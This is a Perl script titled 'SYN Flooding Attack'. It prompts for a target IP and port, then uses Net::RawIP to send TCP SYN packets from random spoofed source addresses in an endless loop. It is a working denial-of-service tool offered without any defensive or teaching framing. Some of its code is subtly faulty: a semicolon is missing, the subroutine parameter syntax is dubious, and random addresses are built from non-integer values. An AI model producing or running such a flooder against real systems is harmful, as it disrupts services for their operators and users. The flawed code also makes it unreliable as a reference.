#!/usr/bin/perl

# SYN Flooding Attack

use Net::RawIP;
 
# Set info needed
print "\n============================";
print "\n[!] Enter the designated ip: "; # Set IP
$ip = <STDIN>;
chomp ($ip);
while (!($ip =~ /(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/)){
	print "\n[!] Enter the designated ip correctly: "; # Re-enter IP
	$ip = <STDIN>;
	chomp ($ip);
}

print "Designated IP ==> $ip";
print "\n============================";
print "\n[!] Enter TCP Port: "; # Set Port
$port = <STDIN>;
chomp ($port);
while (not ($port =~ /^-?\d+$/ ) || ($port <= 0 || $port > 65535)){ 
	print "\n[!] Enter a TCP port correctly: "; # Re-enter Port       
	$port = <STDIN>;
	chomp ($port); 
} 

attack($ip,$port)

# Generates Random Ip
sub randomIP(){
    return rand(255) . "." . rand(255) . "." . rand(255) . "." . rand(255);
}

# Uses random source ip and destination ip to flood the destination with syn segments
sub attack($dest_ip, $dest_port){
   $net_raw_ip = new Net::RawIP;
   while(1) {
      $source_port = int(rand(65535-1))+1;
      $source_ip = randomIP();
	  $net_raw_ip->set({
                      ip  => {
                              saddr => $source_ip,
                              daddr => $dest_ip,
                             },
                      tcp => {
                              source => $source_port,
                              dest   => $dest_port,
                              psh    => 1,
                              syn    => 1,
                             }
                     });
      $net_raw_ip->send;
   }
}
